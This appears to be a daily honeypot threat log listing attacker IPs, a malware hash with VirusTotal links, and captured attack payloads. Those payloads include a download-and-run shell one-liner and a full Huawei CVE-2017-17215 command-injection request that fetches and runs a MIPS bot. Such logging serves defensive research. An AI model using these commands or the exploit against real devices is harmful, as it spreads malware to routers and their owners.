2023/12/07-12-2023

Top 5 IPs for 2023-12-07:
143.110.227.81
107.182.19.250
129.158.216.209
170.210.155.249
43.230.67.235

Malcious files seen: 
Downloaded from : http://144.129.13.190:31780/.i
a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
https://www.virustotal.com/gui/file/a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
Downloaded from : tftp://110.183.26.119/.i
a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
https://www.virustotal.com/gui/file/a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3

cd /data/local/tmp/; busybox wget http://14.225.211.141/ab.sh; sh ab.sh; curl http://14.225.211.141/ac.sh; sh ac.sh; wget http://14.225.211.141/aw.sh; sh aw.sh

Attacker IP : 213.226.96.20
wHuawei epxloit (CVE-2017-17215):

POST /ctrlt/DeviceUpgrade_1 HTTP/1.1

<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 193.233.193.12 -l /tmp/.oxy -r /yeye/yeye.mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
